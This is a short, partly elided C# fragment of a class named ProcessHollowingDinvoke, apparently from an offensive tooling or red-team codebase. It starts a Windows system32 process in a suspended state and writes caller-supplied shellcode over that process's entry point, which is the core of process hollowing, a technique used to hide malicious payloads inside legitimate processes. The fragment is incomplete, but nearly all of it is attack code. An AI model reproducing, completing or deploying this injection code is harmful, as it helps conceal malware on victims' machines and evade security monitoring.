...
class ProcessHollowingDinvoke
{
    public static void Execute(string process, byte[] shellcode)
{
    ...
    bool succ = CreateProcess(null, "C:\\windows\\system32\\"+process, ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
    if (succ)
    {
    ...
    WriteProcessMemory(pi.hProcess, addressofentrypoint, shellcode, shellcode.Length, out nread);
